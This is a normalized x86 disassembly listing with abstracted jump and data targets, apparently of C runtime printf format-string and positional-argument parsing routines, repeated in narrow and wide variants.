mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov eax edx
sub_4274d3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433f54
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x24 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x24 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov eax edx
sub_4275ca
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433e4c
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427956
jmp r-xdata
mov eax edx
sub_427680
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433e4c
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x31 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279a1
jmp r-xdata
mov eax edx
sub_427736
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433f54
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4279ec
jmp r-xdata
mov eax edx
sub_4277ed
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x45c ] 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push [ esi + 0x10 ]
call sub_433f54
add esp 0xc
cmp [ esi + 0x458 ] 0x1
lea edx [ eax - 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x2 ]
mov [ esi + 0x10 ] ecx
jne r-xdata
add [ esi + 0x14 ] 0x4
mov edx [ esi + 0x14 ]
mov ecx [ edx - 0x4 ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
add edx edx
mov eax [ esi + edx * 8 + 0x46c ]
mov eax [ eax ]
mov [ esi + 0x28 ] eax
test edx edx
js r-xdata
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ eax ] 0x24
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp edx 0x64
jge r-xdata
mov eax [ esi + 0xaa4 ]
cmp edx eax
jle r-xdata
push [ esi + 0x2c ]
mov [ esi + 0xaa4 ] eax
mov ecx esi
movzx eax [ esi + 0x32 ]
push eax
shl edx 0x4
lea eax [ esi + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427a39
jmp r-xdata
mov eax edx
sub_427956
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41dae0
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov al [ ebp + 0x10 ]
mov [ edx + 0x4 ] al
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_4279a1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41dc0e
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov al [ ebp + 0x10 ]
mov [ edx + 0x4 ] al
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_4279ec
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41dd3c
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x4 ] ax
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_427a39
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41de5f
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ edx ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x4 ] ax
mov eax [ ebp + 0x14 ]
mov [ edx + 0xc ] eax
mov al 0x1
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
pop ebp
retn 0x10
sub_427a86
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
cmp al 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp al 0x30
jl r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_433e4c
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x1 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp al 0x39
jg r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_433e4c
add esp 0xc
test eax eax
jle r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ edx ] 0x24
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x24
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40dea0
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427b7e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
cmp al 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp al 0x30
jl r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_433e4c
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x1 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp al 0x39
jg r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_433e4c
add esp 0xc
test eax eax
jle r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp [ edx ] 0x24
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x24
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40dea0
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427c76
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
movzx eax [ ecx ]
cmp eax 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp eax 0x30
jb r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_433f54
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x2 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp eax 0x39
ja r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_433f54
add esp 0xc
test eax eax
jle r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
push 0x24
pop eax
cmp [ edx ] ax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x24
pop ecx
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40dea0
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427d78
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
push edi
cmp [ esi + 0x1c ] ebx
jne r-xdata
mov al bl
mov ecx [ esi + 0x10 ]
movzx eax [ ecx ]
cmp eax 0x25
je r-xdata
xor edi edi
cmp [ esi + 0x45c ] edi
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
mov [ ebp - 0x4 ] edi
cmp eax 0x30
jb r-xdata
push 0xa
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push [ esi + 0x10 ]
call sub_433f54
mov edx [ ebp - 0x8 ]
add esp 0xc
lea ecx [ eax - 0x1 ]
lea eax [ edx + 0x2 ]
mov [ esi + 0xaa8 ] ecx
mov [ esi + 0x10 ] eax
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov [ esi + 0x45c ] ebx
cmp eax 0x39
ja r-xdata
test ecx ecx
js r-xdata
push 0xa
lea eax [ ebp - 0x4 ]
push eax
push ecx
call sub_433f54
add esp 0xc
test eax eax
jle r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
push 0x24
pop eax
cmp [ edx ] ax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x24
pop ecx
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x64
jge r-xdata
cmp [ esi + 0x458 ] ebx
jne r-xdata
mov eax [ esi + 0xaa4 ]
cmp ecx eax
jg r-xdata
mov [ esi + 0x45c ] 0x2
jmp r-xdata
push 0x640
lea eax [ esi + 0x464 ]
push edi
push eax
call sub_40dea0
add esp 0xc
mov [ esi + 0xaa4 ] ecx
mov ecx eax
sub_427f0e
mov edi edi
push esi
mov esi ecx
call sub_427e86
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
sub_427f8e
mov edi edi
push esi
mov esi ecx
call sub_427ea8
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
sub_42800e
mov edi edi
push esi
mov esi ecx
call sub_427eca
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
sub_42808e
mov edi edi
push esi
mov esi ecx
call sub_427eec
test al al
jne r-xdata
cmp [ esi + 0x45c ] 0x2
jne r-xdata
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
cmp [ esi + 0x458 ] 0x1
jne r-xdata
mov eax [ esi + 0xaa4 ]
lea edx [ esi + 0x474 ]
shl eax 0x4
lea ecx [ esi + 0x464 ]
add edx eax
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax [ esi + 0x14 ]
mov [ ecx + 0x8 ] eax
mov eax [ ecx ]
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x4
sub eax 0x1
je r-xdata
add [ esi + 0x14 ] 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
add ecx 0x10
sub eax 0x1
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
sub_42811a
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427956
retn
sub_42816d
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4279a1
retn
sub_4281c0
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4279ec
retn
sub_428213
cmp [ ecx + 0x45c ] 0x2
jne r-xdata
mov al 0x1
retn
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp edx 0x64
jge r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427a39
retn
sub_428272
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov eax [ ecx + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
mov al 0x1
push ecx
call sub_4321dd
mov edx eax
mov esi rw-data
pop ecx
cmp edx 0xffffffff
je r-xdata
mov eax esi
cmp edx 0xfffffffe
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
and eax 0x3f
mov ecx edx
imul eax eax 0x30
sar ecx 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
pop esi
pop ebp
retn
test [ esi + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
and edx 0x3f
imul esi edx 0x30
sar eax 0x6
add esi [ eax * 4 + rw-data ]
sub_42833f
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push [ ecx ]
movsx eax [ ebp + 0x8 ]
push eax
call sub_435830
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
inc [ eax ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
jmp r-xdata
pop ebp
retn 0x8
sub_42837c
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push [ ecx ]
push [ ebp + 0x8 ]
call sub_435654
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
inc [ eax ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
jmp r-xdata
pop ebp
retn 0x8
sub_4283bc
mov edi edi
push ebp
mov ebp esp
mov edx ecx
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
cmp eax [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
jne r-xdata
inc [ eax ]
mov eax [ edx ]
inc [ eax + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
mov eax [ edx ]
inc [ eax ]
mov al 0x1
cmp [ ecx + 0xc ] 0x0
je r-xdata
or [ eax ] 0xffffffff
inc [ eax ]
jmp r-xdata
pop ebp
retn 0x8
mov eax [ edx ]
mov al [ eax + 0xc ]
jmp r-xdata
sub_4283fe
mov edi edi
push ebp
mov ebp esp
mov edx ecx
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
cmp eax [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
jne r-xdata
inc [ eax ]
mov eax [ edx ]
inc [ eax + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
mov eax [ edx ]
add [ eax ] 0x2
mov al 0x1
cmp [ ecx + 0xc ] 0x0
je r-xdata
or [ eax ] 0xffffffff
inc [ eax ]
jmp r-xdata
pop ebp
retn 0x8
mov eax [ edx ]
mov al [ eax + 0xc ]
jmp r-xdata
sub_428443
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428b6f
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428b6f
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4284ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428b6f
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_428b6f
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_428591
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_428b6f
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4342ec
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
